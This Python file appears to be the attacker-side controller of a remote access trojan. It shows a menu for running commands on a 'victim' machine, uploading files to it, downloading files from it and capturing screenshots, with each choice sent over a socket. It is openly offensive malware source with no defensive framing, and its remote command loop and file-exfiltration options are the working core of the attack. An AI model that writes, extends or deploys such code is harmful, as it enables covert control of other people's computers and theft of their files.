import subprocess
import os
from fileupload import *
from serverfiledownload import *
from screenshot import *

def show_options():
    print("[1] Run Command On Victiom OS ")
    print("[2] Upload File To Victim Machine ")
    print("[3] Download File From Victim Machine ")
    print("[4] Capture Screenshot")
    print("")
    
def serverhandler(my_socket):
     print("[+] Handling Server Side Connections")
     print("")
     show_options()
     while True :
         ch = input("[+] Select Your Options : ")
         my_socket.send_data(ch)
         if ch == "1" or ch == "01" :
             print("[+] Running Commands On Victim")
             send_commands(my_socket)   #Send System Commands
             
         elif ch == "2" or ch == "02" :
             print ("[+] Uploading Files To Victim")
             #upload files to the victim machine
             upload_file(my_socket)
         elif ch == "3" or ch == "03" :
              #Download files from victim
              receive_file_folder(my_socket)
         elif ch =="4" or ch == "04":
              capture_screenshot(my_socket)

         elif ch == "exit" or ch == "quit":
             break
         else :
             print ("[+] Wrong Option")
             break

def send_commands(my_socket):
     print("[+] Running Commands")
     print(" ")
     while True :
         cmd = input(">> ")
         my_socket.send_data(cmd)
         if cmd == "exit" or cmd == "quit" or cmd == "stop":
             break
         if cmd == "":
             continue
         result = my_socket.receive_result()
         print(result)   
